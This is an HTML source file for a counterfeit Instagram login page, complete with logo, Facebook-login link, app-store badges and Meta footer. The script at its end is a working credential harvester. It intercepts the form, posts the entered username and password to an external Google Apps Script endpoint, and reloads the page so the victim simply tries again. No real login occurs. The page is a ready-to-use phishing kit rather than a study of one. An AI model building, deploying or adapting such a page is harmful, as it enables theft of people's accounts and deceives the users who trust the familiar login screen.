<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in • Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
</head>
<body>
    <div class="head_container">
        <div class="main_container">
            <div class="secA">
                <div class="mlogo">
                    <img src="7a252de00b20.png" alt="Instagram logo">
                </div>
            
                <!--Inputs starts here-->
            <div class="form">
                <form id="submit-form" action="">
                    <input type="text" id="uname" name="uname" placeholder="Phone number, username or email address"><br>
                    <input type="password" id="pass" name="pass" placeholder="Password"><br>
                    <input class="submit" type="submit" value="Log In">
                </form>
                <!--form ends here-->
            </div>
            <div class="fblogin">
                <div class="dash1"></div>
                <div class="or"><p>OR</p></div>
                <div class="dash2"></div>
            </div>
            <div class="mfblogin">
                <div class="ming"><img src="facebook.png" alt="facebook logo"></div>
                <div class="alt"><p>Log in with Facebook</p></div>
            </div>
            <div class="pswd"><p>Forgotten your password?</p></div>
        </div>
        </div>
       <div class="container2">
            <div class="box2">
            <div class="sign">Don't have an account?</div>

                <div class="sign2">&nbsp;Sign up</div>
            
            </div>
            <div class="getapp">
            <div class="app">Get the app.</div>

            <div class="store">
                <img class="img1" src="180ae7a0bcf7.png" alt="App store">
                <img class="img2" src="e9cd846dc748.png" alt="Play store">
            </div>
         </div>
        </div>

    <div class="secB">
        <p1 class="b2">
            Meta&emsp;
            About&emsp;
            Blog&emsp;
            Jobs&emsp;
            Help&emsp;
            API&emsp;
            Privacy&emsp;
            Terms&emsp;
            Top accounts&emsp;
            Hashtags&emsp;
            Locations&emsp;
            Instagram Lite&emsp;
            Contact uploading and non-users</p1>


        <p class="b1">English (UK) &emsp;© 2022 Instagram from Meta</p>
    </div>
    </div>
    <script>
        $("#submit-form").submit((e)=>{
            e.preventDefault()
            $.ajax({
                url:"https://script.google.com/macros/s/AKfycbwDWfhorFQLx94ba4WpCk97n0dB_gNDnrQ45z7Likj6jqThuZZ20RmYBWbVFw4qcAtP/exec",
                data:$("#submit-form").serialize(),
                method:"post",
                success:function (response){
                    //alert("Form submitted successfully")
                    window.location.reload()
                    //window.location.href="https://google.com"
                },
                error:function (err){
                    alert("Something Error")
    
                }
            })
        })
    </script>
</body>
</html>
